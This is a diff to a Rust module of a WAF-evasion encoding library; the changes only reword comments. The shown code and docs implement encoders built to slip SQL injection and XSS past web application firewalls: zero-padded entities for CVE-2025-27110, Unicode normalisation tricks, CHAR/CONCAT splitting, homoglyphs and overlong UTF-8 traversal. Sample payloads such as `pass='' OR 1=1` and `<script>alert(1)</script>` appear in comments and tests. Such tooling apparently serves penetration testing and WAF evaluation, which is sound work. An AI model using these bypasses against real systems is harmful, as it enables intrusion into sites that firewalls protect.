@@ -1,7 +1,7 @@
 //! Unicode and HTML entity encoding strategies.
 use std::fmt::Write as _;
 
-/// Unicode encoding — each character becomes `\uXXXX`.
+/// Unicode encoding (each character becomes `\uXXXX`).
 ///
 /// **Context**: ONLY safe when the target parser performs JSON/JavaScript decoding.
 /// Using this on raw HTTP parameters will send a literal backslash-u sequence.
@@ -23,14 +23,14 @@ pub fn unicode_encode(payload: &str) -> String {
     out
 }
 
-/// IIS/ASP percent Unicode encoding — each character becomes `%uXXXX`.
+/// IIS/ASP percent Unicode encoding (each character becomes `%uXXXX`).
 ///
 /// **Context**: ONLY safe on IIS/ASP classic parsers. IIS `%u` encoding
-/// is bounded to BMP (U+0000–U+FFFF) — non-BMP code points must be
+/// is bounded to BMP (U+0000–U+FFFF), non-BMP code points must be
 /// emitted as UTF-16 surrogate pairs (`%uD83D%uDE00` for 😀, NOT the
 /// invalid `%u1F600`). Pre-fix the loop wrote `ch as u32` straight
 /// into a 4-hex-wide format, silently truncating high bytes for any
-/// supplementary plane char and producing output IIS rejects — which
+/// supplementary plane char and producing output IIS rejects, which
 /// looked encoded but bypassed nothing.
 #[must_use]
 pub fn iis_unicode_encode(payload: &str) -> String {
@@ -49,7 +49,7 @@ pub fn iis_unicode_encode(payload: &str) -> String {
     out
 }
 
-/// JSON string-content escape — produces the escaped INTERIOR of a
+/// JSON string-content escape, produces the escaped INTERIOR of a
 /// JSON string literal (no surrounding `"..."` quotes).
 ///
 /// Pre-fix this wrapped the output in double quotes. The wrapping
@@ -57,12 +57,12 @@ pub fn iis_unicode_encode(payload: &str) -> String {
 /// variant builder which substitutes the result into the operator's
 /// payload at an injection point inside an EXISTING string field
 /// (typical: `{"q": "<wrapped>"}`). Adding our own quotes produced
-/// `{"q": ""actual\"escaped""}` — two strings concatenated, malformed
+/// `{"q": ""actual\"escaped""}`: two strings concatenated, malformed
 /// JSON, server returns 400. The escape characters survived but the
 /// host JSON was broken.
 ///
 /// Removing the wrapping quotes makes the encoder do what its name
-/// says — escape the content. Callers that need a full standalone
+/// says, escape the content. Callers that need a full standalone
 /// JSON-string literal can prepend `"` themselves.
 ///
 /// **Context**: Inject INSIDE an existing JSON string field. Backend
@@ -89,7 +89,7 @@ pub fn json_string_encode(payload: &str) -> String {
     out
 }
 
-/// HTML entity encoding — each character becomes `&#xXX;`.
+/// HTML entity encoding (each character becomes `&#xXX;`).
 ///
 /// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
 #[must_use]
@@ -101,7 +101,7 @@ pub fn html_entity_encode(payload: &str) -> String {
     out
 }
 
-/// HTML decimal entity encoding — each character becomes `&#DD;`.
+/// HTML decimal entity encoding (each character becomes `&#DD;`).
 ///
 /// **Context**: ONLY safe in HTML contexts where the browser decodes entities.
 #[must_use]
@@ -113,38 +113,38 @@ pub fn html_entity_decimal_encode(payload: &str) -> String {
     out
 }
 
-/// HTML entity encoding with zero-padded numeric reference — every
+/// HTML entity encoding with zero-padded numeric reference, every
 /// character becomes either `&#x{:0>width$X};` (hex form) or
 /// `&#{:0>width$};` (decimal form). Leading zeros pad the number to
 /// `pad` characters.
 ///
 /// **CVE-2025-27110** (libmodsecurity3 v3.0.13): the v3.0.13 release
 /// regressed entity decoding such that any HTML numeric character
-/// reference whose digits include leading zeros — `&#0060;` for `<`,
-/// `&#x003C;` for `<` — bypasses the decode pass entirely. The
+/// reference whose digits include leading zeros: `&#0060;` for `<`,
+/// `&#x003C;` for `<`: bypasses the decode pass entirely. The
 /// undecoded entity reaches the WAF's inspection buffer; pattern-match
 /// rules anchored on the literal `<`, `'`, `"`, etc. never fire.
 /// libmodsecurity 3.0.14 fixes this. Every WAF deployment still on
-/// 3.0.13 — which Snyk's 2025 State of Open Source Security flagged
-/// as a common version-lag profile — is bypassed by routing the
+/// 3.0.13, which Snyk's 2025 State of Open Source Security flagged
+/// as a common version-lag profile, is bypassed by routing the
 /// payload through this single encoding pass.
 ///
 /// `pad` selects the leading-zero width (1 = none, 4 = `&#x003C;`,
 /// 6 = `&#x00003C;`, 8 = `&#x0000003C;`). The CVE write-up
-/// recommends probing widths 4, 6, 8 — different parser
+/// recommends probing widths 4, 6, 8, different parser
 /// implementations diverge on how many leading zeros they tolerate.
 ///
 /// `hex` selects the radix: `true` emits `&#xHH;`, `false` emits
-/// `&#DD;`. The CVE affects both — they share the regression site
+/// `&#DD;`. The CVE affects both, they share the regression site
 /// in libmodsecurity's `Utils::HtmlEntity::convert_2_unicode`.
 ///
 /// **Bypass mechanism**: see CVE-2025-27110 advisory at
 /// <https://modsecurity.org/20250225/html-entity-decoding-regression-cve-2025-27110-2025-february/>.
 ///
-/// Pass 21 R67 — frontier technique #6 per the 2025 research scan.
+/// Pass 21 R67 (frontier technique #6 per the 2025 research scan).
 #[must_use]
 pub fn html_entity_zero_pad(payload: &str, pad: usize, hex: bool) -> String {
-    // Cap pad at 16 — beyond that we're way past any sensible parser
+    // Cap pad at 16, beyond that we're way past any sensible parser
     // tolerance and just bloating the output. A pathological 1MB
     // padding would turn a 1KB payload into 16MB. Anti-DoS guard
     // matches the spirit of MAX_DOUBLE_ENCODE_INPUT in url_mutate.
@@ -167,13 +167,13 @@ pub fn html_entity_zero_pad(payload: &str, pad: usize, hex: bool) -> String {
 /// WAF regexes (which typically anchor on `&#x[0-9a-f]+;` with a lowercase
 /// `x` and required `;`) miss:
 ///
-/// 1. `&#xHH;`     — canonical lowercase-x hex
-/// 2. `&#XHH;`     — uppercase-X hex (browsers accept; case-sensitive regex misses)
-/// 3. `&#DD;`      — decimal
-/// 4. `&#000DD;`   — decimal with leading zeros (HTML5 spec allows arbitrary leading zeros)
+/// 1. `&#xHH;`: canonical lowercase-x hex
+/// 2. `&#XHH;`: uppercase-X hex (browsers accept; case-sensitive regex misses)
+/// 3. `&#DD;`: decimal
+/// 4. `&#000DD;`: decimal with leading zeros (HTML5 spec allows arbitrary leading zeros)
 ///
 /// Rotation is by character index (deterministic; same input always
-/// produces the same output — important for proptest idempotency).
+/// produces the same output (important for proptest idempotency)).
 ///
 /// **Bypass mechanism**: a `ModSecurity` regex like
 /// `@rx &#x([0-9a-f]+);.*&#x([0-9a-f]+);` won't match a payload of
@@ -208,7 +208,7 @@ pub fn html_entity_variants(payload: &str) -> String {
     out
 }
 
-/// Fullwidth Unicode encoding — replaces ASCII with fullwidth equivalents.
+/// Fullwidth Unicode encoding (replaces ASCII with fullwidth equivalents).
 ///
 /// Maps `!`–`~` (0x21–0x7E) to the fullwidth range `！`–`～` (0xFF01–0xFF5E).
 /// Spaces become ideographic space (U+3000).
@@ -216,7 +216,7 @@ pub fn html_entity_variants(payload: &str) -> String {
 /// **Bypass mechanism**: Many WAFs regex against ASCII keywords like `SELECT`,
 /// `UNION`, `<script>`, etc. Fullwidth characters are visually identical but
 /// have different codepoints, so regex fails. However, backends that perform
-/// Unicode NFKC normalization will convert them back to ASCII — meaning the
+/// Unicode NFKC normalization will convert them back to ASCII, meaning the
 /// payload executes while the WAF never saw it.
 ///
 /// **Context**: Effective against WAFs in front of servers that normalize Unicode
@@ -238,7 +238,7 @@ pub fn fullwidth_encode(payload: &str) -> String {
     out
 }
 
-/// Mathematical Alphanumeric Symbols encoding — replaces ASCII letters and
+/// Mathematical Alphanumeric Symbols encoding, replaces ASCII letters and
 /// digits with their Math-Bold counterparts in the Unicode `U+1D400` block.
 ///
 /// `A`–`Z` → `U+1D400`–`U+1D419` (Math Bold Capitals: 𝐀 𝐁 … 𝐙)
@@ -254,11 +254,11 @@ pub fn fullwidth_encode(payload: &str) -> String {
 /// `unicodedata.normalize('NFKC', s)`, Go `golang.org/x/text/unicode/norm`)
 /// see the original `SELECT` / `UNION` / `script` keyword and execute /
 /// render it. WAFs scanning bytes for ASCII keywords see codepoints in the
-/// `U+1D400` block — no keyword match.
+/// `U+1D400` block (no keyword match).
 ///
 /// **Distinct from `fullwidth_encode`**: fullwidth uses the `U+FF00`
 /// Halfwidth-and-Fullwidth-Forms block. Math Alphanumeric uses the
-/// `U+1D400` block — different code range, different WAF coverage gap.
+/// `U+1D400` block (different code range, different WAF coverage gap).
 /// WAFs that block fullwidth (a common technique since 2020) often do not
 /// also block Math Alphanumeric Symbols. Both encode-paths NFKC to ASCII.
 ///
@@ -280,7 +280,7 @@ pub fn math_bold_encode(payload: &str) -> String {
     out
 }
 
-/// Mathematical Italic alphabet — same NFKC trick as `math_bold_encode`
+/// Mathematical Italic alphabet, same NFKC trick as `math_bold_encode`
 /// but in a different Unicode block (U+1D434 uppercase, U+1D44E
 /// lowercase). WAFs that have added detection for the bold range
 /// (U+1D400-) do not always cover italic.
@@ -306,10 +306,10 @@ pub fn math_italic_encode(payload: &str) -> String {
     out
 }
 
-/// Mathematical Script alphabet — uppercase U+1D49C, lowercase U+1D4B6.
+/// Mathematical Script alphabet (uppercase U+1D49C, lowercase U+1D4B6).
 /// Script has SIX holes (U+1D49D B, U+1D4A0 E, U+1D4A1 F, U+1D4A3 H,
 /// U+1D4A4 I, U+1D4A7 M, U+1D4AD R, U+1D4BA e, U+1D4BC g, U+1D4C4 o)
-/// — each filled by the letterlike-symbols block (U+212C BCRIPT
+///: each filled by the letterlike-symbols block (U+212C BCRIPT
 /// CAPITAL B, U+2130 SCRIPT CAPITAL E, etc.) so the encoded string
 /// stays NFKC-equivalent to ASCII.
 #[must_use]
@@ -337,7 +337,7 @@ pub fn math_script_encode(payload: &str) -> String {
     out
 }
 
-/// Mathematical Fraktur (blackletter) alphabet — uppercase U+1D504,
+/// Mathematical Fraktur (blackletter) alphabet, uppercase U+1D504,
 /// lowercase U+1D51E. Fraktur has holes at C/H/I/R/Z which are filled
 /// by U+212D ℭ, U+210C ℌ, U+2111 ℑ, U+211C ℜ, U+2128 ℨ.
 #[must_use]
@@ -359,7 +359,7 @@ pub fn math_fraktur_encode(payload: &str) -> String {
     out
 }
 
-/// Mathematical Double-Struck (blackboard bold) alphabet — uppercase
+/// Mathematical Double-Struck (blackboard bold) alphabet, uppercase
 /// U+1D538, lowercase U+1D552. Holes at C/H/N/P/Q/R/Z filled from
 /// the letterlike-symbols block.
 #[must_use]
@@ -385,7 +385,7 @@ pub fn math_double_struck_encode(payload: &str) -> String {
     out
 }
 
-/// Letterlike-symbols + circled-Latin selective substitution — replaces
+/// Letterlike-symbols + circled-Latin selective substitution, replaces
 /// individual ASCII letters in the payload with codepoints from
 /// U+2100-214F and U+24B6-24E9 that NFKC-normalize back to the original
 /// ASCII letter. Unlike the math-*-encode functions which substitute
@@ -394,7 +394,7 @@ pub fn math_double_struck_encode(payload: &str) -> String {
 /// keeping the encoded string visibly identifiable.
 ///
 /// The HackerNoon-documented `ŚεℒℇℂƮ` payload is essentially this
-/// function applied to the SQL keyword `SELECT` — backend's NFKC casts
+/// function applied to the SQL keyword `SELECT`: backend's NFKC casts
 /// it to `SELECT` and executes; the WAF's signature regex sees an
 /// unrecognized codepoint sequence.
 #[must_use]
@@ -433,14 +433,14 @@ pub fn letterlike_encode(payload: &str) -> String {
     out
 }
 
-/// SQL string-literal CONCAT splitter — converts every single-quoted string
+/// SQL string-literal CONCAT splitter, converts every single-quoted string
 /// in the payload to a `CONCAT('a','b',...)` expression with one char per
 /// argument.
 ///
 /// Input  `'admin'`  → output  `CONCAT('a','d','m','i','n')`
 ///
 /// **Bypass mechanism**: CRS rules and most commercial WAF blocklists
-/// scan for literal danger-string substrings — `'admin'`, `'password'`,
+/// scan for literal danger-string substrings: `'admin'`, `'password'`,
 /// `'union'`, `'or 1'`, `'/etc/passwd'`. CONCAT-splitting decomposes the
 /// substring into one-character literals that no individual literal-string
 /// regex matches. The DB evaluates `CONCAT(...)` to the original string at
@@ -448,14 +448,14 @@ pub fn letterlike_encode(payload: &str) -> String {
 ///
 /// Supported by MySQL, MariaDB, PostgreSQL, MSSQL (all ship CONCAT as a
 /// scalar function). Oracle uses `CONCAT(a,b)` as binary-only, so chained
-/// 1-char Oracle calls would need a nested form — out of scope here; the
+/// 1-char Oracle calls would need a nested form, out of scope here; the
 /// `||` pipe concat in PostgreSQL/Oracle is a separate tamper.
 ///
 /// **Edge cases**:
-/// - Empty string literals (`''`) become `CONCAT('')` — valid SQL,
+/// - Empty string literals (`''`) become `CONCAT('')`: valid SQL,
 ///   evaluates to empty string.
 /// - Escaped quotes inside strings (`'O\'Brien'`) are passed through as
-///   raw chars to CONCAT — the backslash and quote are split into separate
+///   raw chars to CONCAT, the backslash and quote are split into separate
 ///   args.
 /// - Strings not in single quotes are left alone (no aggressive parsing
 ///   of double-quoted SQL Server identifiers).
@@ -470,7 +470,7 @@ pub fn sql_concat_split(payload: &str) -> String {
             out.push(ch);
             continue;
         }
-        // Found opening quote — collect chars until closing quote.
+        // Found opening quote (collect chars until closing quote).
         let mut literal = String::new();
         let mut closed = false;
         while let Some(&next) = chars.peek() {
@@ -482,7 +482,7 @@ pub fn sql_concat_split(payload: &str) -> String {
             literal.push(next);
         }
         if !closed {
-            // Unbalanced quote — emit original opener + collected chars.
+            // Unbalanced quote (emit original opener + collected chars).
             out.push('\'');
             out.push_str(&literal);
             continue;
@@ -492,7 +492,7 @@ pub fn sql_concat_split(payload: &str) -> String {
         if literal.is_empty() {
             out.push_str("''");
         } else {
-            // Direct write loop instead of collect+join — saves N+1
+            // Direct write loop instead of collect+join, saves N+1
             // heap String allocations per literal. Per perf-hunt F03.
             let mut first = true;
             for c in literal.chars() {
@@ -514,35 +514,35 @@ pub fn sql_concat_split(payload: &str) -> String {
     out
 }
 
-/// SQL CHAR()-function decomposition — converts every single-quoted string
+/// SQL CHAR()-function decomposition, converts every single-quoted string
 /// literal in the payload to a `CHAR(N1,N2,...)` function call with one
 /// codepoint per argument.
 ///
 /// Input  `'admin'`  → output  `CHAR(97,100,109,105,110)`
 ///
 /// **Bypass mechanism**: distinct from `sql_concat_split` (which produces
-/// `CONCAT('a','d',...)`) — CHAR() takes integer codepoints, not single-
+/// `CONCAT('a','d',...)`). CHAR() takes integer codepoints, not single-
 /// char strings, so the payload contains NO single-quoted ASCII tokens at
 /// all. WAF rules that match string-literal patterns (`'admin'`,
 /// `'password'`, `'/etc/passwd'`, `'or 1'`) and CONCAT-shaped patterns
 /// (`CONCAT\(.{,8}\)`) both miss this form. Most CRS rules through PL3 do
-/// NOT pattern-match raw CHAR() — it's been the sqlmap default for over a
+/// NOT pattern-match raw CHAR(), it's been the sqlmap default for over a
 /// decade and has been deemed too noisy to block.
 ///
 /// Supported by MySQL, MariaDB (native `CHAR()`), MSSQL (`CHAR()`). For
-/// Postgres / Oracle, the equivalent is `CHR()` — out of scope here; a
+/// Postgres / Oracle, the equivalent is `CHR()`: out of scope here; a
 /// sibling `chr_decompose` could ship later.
 ///
 /// **Edge cases**:
 /// - Empty literals (`''`) pass through as `''` unchanged. `CHAR()`
-///   with zero args evaluates to NULL in MySQL — silently flipping
+///   with zero args evaluates to NULL in MySQL, silently flipping
 ///   a comparison like `pass='' OR 1=1` into `pass=NULL OR 1=1`
 ///   would break the auth bypass (`= NULL` is never TRUE). Preserve
 ///   the empty-string identity.
 /// - Multi-byte UTF-8 chars produce a single `CHAR(codepoint)` per
-///   `chars()` iteration — for codepoints > 255, MySQL's CHAR() returns
+///   `chars()` iteration, for codepoints > 255, MySQL's CHAR() returns
 ///   per-byte; the codepoint may not round-trip exactly. Most SQLi
-///   payloads use ASCII literals — this matters only for adversarial
+///   payloads use ASCII literals, this matters only for adversarial
 ///   inputs.
 /// - Unbalanced opening quote: emitted unchanged.
 ///
@@ -576,14 +576,14 @@ pub fn sql_char_decompose(payload: &str) -> String {
         // arguments evaluates to NULL in MySQL, not the empty
         // string. Auth-bypass payloads using `''` (e.g.
         // `pass='' OR 1=1`) would silently flip the comparison
-        // to NULL — `WHERE pass=NULL` is never TRUE, so the
+        // to NULL: `WHERE pass=NULL` is never TRUE, so the
         // bypass fails. Preserve the empty-string identity.
         if literal.is_empty() {
             out.push_str("''");
             continue;
         }
         out.push_str("CHAR(");
-        // Direct write loop — per perf-hunt F03.
+        // Direct write loop (per perf-hunt F03).
         let mut first = true;
         for c in literal.chars() {
             if !first {
@@ -597,13 +597,13 @@ pub fn sql_char_decompose(payload: &str) -> String {
     out
 }
 
-/// Postgres / Oracle CHR()-function decomposition — `CHR(N) || CHR(N) || ...`
+/// Postgres / Oracle CHR()-function decomposition. `CHR(N) || CHR(N) || ...`
 /// per char of every single-quoted string literal.
 ///
 /// Input  `'admin'`  →  output  `(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))`
 ///
 /// Differs from `sql_char_decompose` (which uses MySQL's variadic
-/// `CHAR(N1,N2,...)`) — Postgres / Oracle `CHR()` is unary, so codepoints
+/// `CHAR(N1,N2,...)`). Postgres / Oracle `CHR()` is unary, so codepoints
 /// are concatenated via the SQL standard `||` pipe operator. The wrapping
 /// parens preserve precedence inside larger expressions (`WHERE u = ...`).
 ///
@@ -641,7 +641,7 @@ pub fn pg_chr_decompose(payload: &str) -> String {
             out.push_str("('')");
             continue;
         }
-        // Direct write loop — per perf-hunt F03.
+        // Direct write loop (per perf-hunt F03).
         out.push('(');
         let mut first = true;
         for c in literal.chars() {
@@ -656,13 +656,13 @@ pub fn pg_chr_decompose(payload: &str) -> String {
     out
 }
 
-/// Partial JSON Unicode escape — encodes ASCII alphanumeric chars as
+/// Partial JSON Unicode escape, encodes ASCII alphanumeric chars as
 /// `\uXXXX` while leaving structural punctuation (quotes, operators,
 /// whitespace) bare.
 ///
 /// **Bypass mechanism**: Keyword fingerprint rules (UNION, SELECT, alert,
 /// script, eval, …) match against the byte sequence. Splitting the
-/// keyword across Unicode escapes defeats them — the origin's JSON
+/// keyword across Unicode escapes defeats them, the origin's JSON
 /// parser / JS engine re-materializes the keyword at the application
 /// layer, but the WAF sees `UNION` in the wire
 /// bytes and finds no `UNION`. Distinct from [`unicode_encode`] which
@@ -671,7 +671,7 @@ pub fn pg_chr_decompose(payload: &str) -> String {
 /// payload still looks like data.
 ///
 /// **Idempotent**: pre-existing `\uXXXX` sequences in the input are
-/// detected and passed through verbatim — second-pass tampering does
+/// detected and passed through verbatim, second-pass tampering does
 /// not re-escape an already-escaped char.
 ///
 /// **Context**: ONLY safe when the target parser performs
@@ -683,10 +683,10 @@ pub fn json_unicode_alnum(payload: &str) -> String {
     // payload length) with a byte-slice lookahead on `as_bytes()`. The
     // `\uXXXX` idempotency-detection sequence consists entirely of ASCII
     // bytes (backslash, 'u', 4 hex digits), so all six bytes are 1:1 with
-    // codepoints — the byte index is also the char index for that prefix,
+    // codepoints, the byte index is also the char index for that prefix,
     // and we can safely skip 6 bytes (= 6 ASCII chars) at once when the
     // pattern fires. For non-ASCII codepoints we fall through to the else
-    // branch and push them unchanged — those code paths never call
+    // branch and push them unchanged, those code paths never call
     // `chars[i+1]` so the ASCII assumption holds.
     //
     // Measured improvement on a 40-char SQL payload:
@@ -726,7 +726,7 @@ pub fn json_unicode_alnum(payload: &str) -> String {
     out
 }
 
-/// Full JSON `\uXXXX` escape — escapes EVERY character of the input
+/// Full JSON `\uXXXX` escape, escapes EVERY character of the input
 /// (including punctuation, whitespace, and control chars). Stronger
 /// than `json_unicode_alnum` which only touches alnum chars. Use when
 /// the WAF tokenises on punctuation boundaries that `json_unicode_alnum`
@@ -772,11 +772,11 @@ pub fn json_unicode_full(payload: &str) -> String {
     out
 }
 
-/// Mixed-case JSON `\uXXXX` escape — alternates `\u` and `\U` plus
+/// Mixed-case JSON `\uXXXX` escape, alternates `\u` and `\U` plus
 /// upper/lowercase hex digits. Some WAF regexes are case-sensitive
 /// against `\u[0-9A-F]{4}`; JSON parsers RFC 8259 only accept `\u`
 /// lowercase, but JavaScript `JSON.parse` and PHP `json_decode`
-/// tolerate both — pick the form the backend tolerates and the WAF's
+/// tolerate both, pick the form the backend tolerates and the WAF's
 /// regex misses.
 ///
 /// Output alternates per-char between four forms:
@@ -807,7 +807,7 @@ pub fn json_unicode_mixed_case(payload: &str) -> String {
     out
 }
 
-/// SQL adjacent-string-literal concatenation — every `'string'` literal of
+/// SQL adjacent-string-literal concatenation, every `'string'` literal of
 /// length ≥ 2 is rewritten as a sequence of single-character adjacent
 /// literals: `'admin'` → `'a' 'd' 'm' 'i' 'n'`.
 ///
@@ -817,11 +817,11 @@ pub fn json_unicode_mixed_case(payload: &str) -> String {
 /// all implement this. WAF rules that match the literal substring of
 /// well-known credentials or paths (e.g. `'admin'`, `'/etc/passwd'`)
 /// see N unrelated single-character strings instead of one token. The
-/// database rejoins them at parse time — no comments, no CONCAT calls,
+/// database rejoins them at parse time, no comments, no CONCAT calls,
 /// no special functions. Pure SQL semantics.
 ///
 /// **Idempotent**: every output sub-literal has length 1, below the
-/// split threshold — a second pass leaves the output unchanged.
+/// split threshold (a second pass leaves the output unchanged).
 ///
 /// **Context**: Effective against any byte-pattern WAF inspecting
 /// SQL bodies. Inert outside SQL context (won't fire on non-quoted
@@ -901,7 +901,7 @@ pub fn sql_adjacent_string_concat(payload: &str) -> String {
     out
 }
 
-/// Homoglyph substitution — replaces select ASCII characters with visually
+/// Homoglyph substitution, replaces select ASCII characters with visually
 /// identical Unicode characters from other scripts.
 ///
 /// **Bypass mechanism**: WAFs match `'`, `"`, `<`, `>`, `=`, etc. as literal
@@ -916,11 +916,11 @@ pub fn homoglyph_encode(payload: &str) -> String {
     let mut out = String::with_capacity(payload.len() * 4);
     for ch in payload.chars() {
         let mapped = match ch {
-            // INTENTIONALLY NOT REPLACED — SQL string delimiters.
+            // INTENTIONALLY NOT REPLACED: SQL string delimiters.
             // Pre-fix `'` → U+2019 and `"` → U+201D were mapped to
             // their right-single/double quotation marks. Those
             // codepoints are NOT recognised as string delimiters
-            // by ANY SQL parser — they're treated as word
+            // by ANY SQL parser, they're treated as word
             // characters. The host query's string literal is never
             // closed, the injection context-break disappears, and
             // the payload becomes inert. Modern frameworks rarely
@@ -960,7 +960,7 @@ pub fn homoglyph_encode(payload: &str) -> String {
 /// misses; the browser's HTML parser drops the ZWSP and renders.
 ///
 /// Use [`ZERO_WIDTH_DEFAULTS`] for the recommended cycle of
-/// [U+200B, U+200C, U+200D, U+FEFF, U+034F] — rotating across these
+/// [U+200B, U+200C, U+200D, U+FEFF, U+034F], rotating across these
 /// per-position defeats WAFs that have hardcoded a single zero-width
 /// stripper.
 #[must_use]
@@ -1014,14 +1014,14 @@ pub fn combining_mark_inject(payload: &str, mark: char) -> String {
 /// that the WAF regex sees as different bytes. Two sub-classes:
 ///
 /// 1. **Non-normalising** (Cyrillic ѕ U+0455, е U+0435, о U+043E,
-///    а U+0430; Greek ο U+03BF, ν U+03BD, …) — backend and WAF both
+///    а U+0430; Greek ο U+03BF, ν U+03BD, …), backend and WAF both
 ///    see different codepoints, but MSSQL's implicit Unicode→varchar
 ///    coercion maps Cyrillic lookalikes to ASCII via collation
 ///    (`SQL_Latin1_General_CP1_CI_AI`).
-/// 2. **NFKC-normalising** — letterlike block letters (already covered
+/// 2. **NFKC-normalising**: letterlike block letters (already covered
 ///    by `letterlike_encode`).
 ///
-/// This function targets class 1 only — for class 2 use
+/// This function targets class 1 only, for class 2 use
 /// [`letterlike_encode`] / `math_*_encode`.
 #[must_use]
 pub fn script_homoglyph_encode(payload: &str) -> String {
@@ -1100,7 +1100,7 @@ pub fn sharp_s_encode(payload: &str) -> String {
         .collect()
 }
 
-/// AWS WAF JSON-pointer escape — encode every char of `key` as
+/// AWS WAF JSON-pointer escape, encode every char of `key` as
 /// `\uXXXX` so the WAF's JSON-pointer rule (e.g. `/id` literal-match)
 /// misses, while the backend JSON parser decodes the escape and
 /// routes the value to the original field.
@@ -1129,7 +1129,7 @@ pub fn json_key_unicode_escape(key: &str, value: &str) -> String {
 
 /// Overlong UTF-8 encoding of `.` and `/` for path traversal.
 ///
-/// CRS GitHub issue #4189 (opened 2025-07, still open) — CRS does
+/// CRS GitHub issue #4189 (opened 2025-07, still open). CRS does
 /// not alert on `%c0%ae%c0%ae%c0%af` (`../` in 2-byte overlong UTF-8).
 /// Servers that strictly decode UTF-8 reject these as malformed; older
 /// JVMs, some C libs (CVE-2017-9805 Struts2), and a non-trivial set
@@ -1172,14 +1172,14 @@ pub fn overlong_utf8_path(path: &str, width: u8) -> String {
     out
 }
 
-/// Bidi override wrapper — wraps `reversed_keyword` between U+202E
+/// Bidi override wrapper, wraps `reversed_keyword` between U+202E
 /// (RIGHT-TO-LEFT OVERRIDE) and U+202C (POP DIRECTIONAL FORMATTING).
 ///
 /// The WAF scans left-to-right byte order: it sees `tceleS`. Rendered
 /// text in a BiDi-aware viewer (e.g. browser, IDE, security analyst's
 /// dashboard) shows `Select`. CVE-2021-42574 (Trojan Source) class.
 ///
-/// **Narrow direct bypass surface** — most SQL parsers reject bare
+/// **Narrow direct bypass surface**: most SQL parsers reject bare
 /// U+202E. Useful primarily for WAF log poisoning and rule-auditing
 /// tool confusion; some template engines do strip bidi chars before
 /// forwarding, in which case the reversed payload becomes live.
@@ -1266,7 +1266,7 @@ mod tests {
 
     #[test]
     fn json_unicode_alnum_idempotent_skip_pass() {
-        // Second pass MUST be a no-op — already-escaped \uXXXX
+        // Second pass MUST be a no-op, already-escaped \uXXXX
         // sequences are detected and passed through.
         let once = json_unicode_alnum("UNION SELECT");
         let twice = json_unicode_alnum(&once);
@@ -1275,14 +1275,14 @@ mod tests {
 
     #[test]
     fn json_unicode_alnum_preserves_quote_unencoded() {
-        // ' is U+0027 — NOT alphanumeric, so must stay literal.
+        // ' is U+0027: NOT alphanumeric, so must stay literal.
         let out = json_unicode_alnum("'");
         assert_eq!(out, "'");
     }
 
     #[test]
     fn json_unicode_alnum_xss_keyword_split() {
-        // <script>alert — `<`, `>`, `(`, `)` stay bare; letters/digits escape.
+        // <script>alert: `<`, `>`, `(`, `)` stay bare; letters/digits escape.
         let out = json_unicode_alnum("<script>alert(1)</script>");
         assert!(!out.contains("script"));
         assert!(!out.contains("alert"));
@@ -1311,7 +1311,7 @@ mod tests {
 
     #[test]
     fn sql_adjacent_string_concat_idempotent() {
-        // Well-formed (balanced quotes) payload — the literals 'admin'
+        // Well-formed (balanced quotes) payload, the literals 'admin'
         // and 'root' each shatter into single-char adjacent literals.
         let once = sql_adjacent_string_concat("WHERE x='admin' OR y='root'");
         let twice = sql_adjacent_string_concat(&once);
@@ -1322,15 +1322,15 @@ mod tests {
 
     #[test]
     fn sql_adjacent_string_concat_preserves_outside_literal() {
-        // No quoted literal in payload — must be a no-op.
+        // No quoted literal in payload (must be a no-op).
         assert_eq!(sql_adjacent_string_concat("1 OR 1=1--"), "1 OR 1=1--");
     }
 
     #[test]
     fn sql_adjacent_string_concat_handles_escaped_quote() {
         // SQL '' escape inside a literal: the position holding `'` is
-        // emitted as the four-quote form `''''` — opening, escaped pair,
-        // closing — which parses as a length-1 literal containing `'`.
+        // emitted as the four-quote form `''''`: opening, escaped pair,
+        // closing (which parses as a length-1 literal containing `'`).
         // The database reassembles "O" + "'" + "B" + "r" + "i" + "e" + "n".
         let out = sql_adjacent_string_concat("'O''Brien'");
         assert_eq!(out, "'O' '''' 'B' 'r' 'i' 'e' 'n'");
@@ -1384,7 +1384,7 @@ mod tests {
 
     #[test]
     fn json_unicode_alnum_unicode_input_passes_through() {
-        // Non-ASCII chars (日本語) are NOT ascii_alphanumeric — left bare.
+        // Non-ASCII chars (日本語) are NOT ascii_alphanumeric (left bare).
         // This keeps the function focused on the keyword-bypass mission.
         let out = json_unicode_alnum("日本");
         assert_eq!(out, "日本");
@@ -1411,7 +1411,7 @@ mod tests {
 
     #[test]
     fn iis_unicode_encode_bmp_only_for_3byte_utf8() {
-        // U+65E5 (日) is BMP — emits as a single %uXXXX, no
+        // U+65E5 (日) is BMP, emits as a single %uXXXX, no
         // surrogate. This is the existing happy path.
         assert_eq!(iis_unicode_encode("日"), "%u65E5");
     }
@@ -1419,7 +1419,7 @@ mod tests {
     #[test]
     fn iis_unicode_encode_non_bmp_emits_surrogate_pair() {
         // U+1F600 (😀) is supplementary plane. Pre-fix this emitted
-        // `%u1F600` (5 hex digits — invalid IIS %u, silently
+        // `%u1F600` (5 hex digits, invalid IIS %u, silently
         // unencodable, bypass-rate killer). Post-fix it MUST emit a
         // UTF-16 surrogate pair `%uD83D%uDE00`.
         assert_eq!(iis_unicode_encode("😀"), "%uD83D%uDE00");
@@ -1429,7 +1429,7 @@ mod tests {
     fn iis_unicode_encode_mixed_bmp_and_non_bmp() {
         // Adversarial: a mix of plain ASCII + BMP + supplementary
         // must produce exactly one %uXXXX or %uXXXX%uXXXX per char.
-        // No 5-digit %u sequences anywhere — pin the regression.
+        // No 5-digit %u sequences anywhere (pin the regression).
         let out = iis_unicode_encode("A日😀");
         assert_eq!(out, "%u0041%u65E5%uD83D%uDE00");
         // Anti-regression: scan for any 5-hex-digit %u sequence.
@@ -1529,7 +1529,7 @@ mod tests {
     fn html_entity_zero_pad_width_above_cap_is_clamped() {
         // Boundary: pad=100 is an anti-DoS concern. We clamp at 16.
         // The result for 'A' (0x41 = 2 hex digits) padded to 16 is
-        // `&#x0000000000000041;` — 14 leading zeros. Pin the exact
+        // `&#x0000000000000041;`: 14 leading zeros. Pin the exact
         // byte sequence so a future change to the cap is visible
         // (and intentional).
         assert_eq!(html_entity_zero_pad("A", 100, true), "&#x0000000000000041;");
@@ -1564,14 +1564,14 @@ mod tests {
 
     #[test]
     fn html_entity_variants_cycles_four_forms() {
-        // 'A'=0x41=65 — verify each of the four rotation slots
+        // 'A'=0x41=65, verify each of the four rotation slots
         let encoded = html_entity_variants("AAAA");
         assert_eq!(encoded, "&#x41;&#X41;&#65;&#00065;");
     }
 
     #[test]
     fn html_entity_variants_continues_rotation() {
